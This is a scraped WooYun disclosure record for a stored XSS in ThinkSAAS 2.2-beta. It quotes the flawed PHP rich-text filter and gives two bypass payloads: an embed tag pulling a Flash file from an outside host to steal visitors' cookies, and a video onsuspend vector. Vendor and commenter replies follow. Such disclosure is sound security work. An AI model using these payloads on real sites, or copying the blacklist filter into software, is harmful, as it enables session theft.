{"id": 54772, "wybug_id": "wooyun-2014-063398", "wybug_title": "ThinkSAAS 2.2-beta 存储型XSS", "wybug_corp": "thinksaas.cn", "wybug_author": "mramydnei", "wybug_date": "2014-06-03 19:05", "wybug_open_date": "2014-09-01 19:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向公众公开  简要描述： 富文本过滤不严格导致可植入恶意脚本盗取用户cookies 详细说明：  对比了一下 WooYun: Thinksaas存储型XSS ，发现确实更新了。我就无耻的来了。下面是对富文本过滤的代码片段：\nfunction cleanJs($text) {\t$text = trim ( $text );\t//$text = stripslashes ( $text );\t// å®Œå…¨è¿‡æ»¤æ³¨é‡Š\t$text = preg_replace ( '/<!--?.*-->/', '', $text );\t// å®Œå…¨è¿‡æ»¤åŠ¨æ€ä»£ç \t$text = preg_replace ( '/<\\?|\\?>/', '', $text );\t// å®Œå…¨è¿‡æ»¤js\t$text = preg_replace ( '/<script?.*\\/script>/', '', $text );\t// è¿‡æ»¤å¤šä½™html\t$text = preg_replace ( '/<\\/?(html|head|meta|link|base|body|title|style|script|form|iframe|frame|frameset|math|maction|marquee)[^><]*>/i', '', $text );\t// è¿‡æ»¤onäº‹ä»¶lang js\twhile ( preg_match ( '/(<[^><]+)(data|onfinish|onmouse|onexit|onerror|onclick|onkey|onload|onchange|onfocus|onblur|onscroll)[^><]+/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1], $text );\t}\twhile ( preg_match ( '/(<[^><]+)(window\\.|javascript:|js:|about:|file:|document\\.|vbs:|cookie)([^><]*)/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1] . $mat [3], $text );\t}\treturn $text;}\n这个Filter依然存在很多问题，比如我们可以植入恶意的flash文件来盗取访问该页面的其它用户的cookies。该问题已在官网上重现。\n<embed allowScriptAccess=always src=http://x55.me/x55.swf>\n除此之外看到有人说，对于这个Filter已经没有什么好用的event handler可以用来触发xss了，我觉得好像也不是。所以再提供一种方案：\n<video onsuspend=alert(10) src=//x55.me/1.ogg>\n上面的XSS Vector在chrome/firefox/Opera下有效。\n\n   漏洞证明：  攻击者在目标站插入恶意代码：\n\n用户访问被插入恶意代码的页面时cookies被发送到攻击者的收信端：\n\n攻击者成功获取受害者的cookies：\n\n   修复方案：  完善过滤规则   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-06-03 22:16 厂商回复： 请给出过滤方案代码，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-03 19:37 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @疯狗为什么....http://www.wooyun.org/bugs/wooyun-2014-063319/trace/abe9cb2969716d56fd9f12c6623822e7    \n     2014-06-04 07:44 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @thinksaas.cn 写这个过滤方案，可能比你写CMS还要费几倍的，甚至几十倍的时间 恕我给不了……     \n     2014-06-04 10:37 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @mramydnei 话说上次发现的XSS，他们也只是草草修复一下而已...就过滤了我XSS代码用的 <marquee> 和 onscroll    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}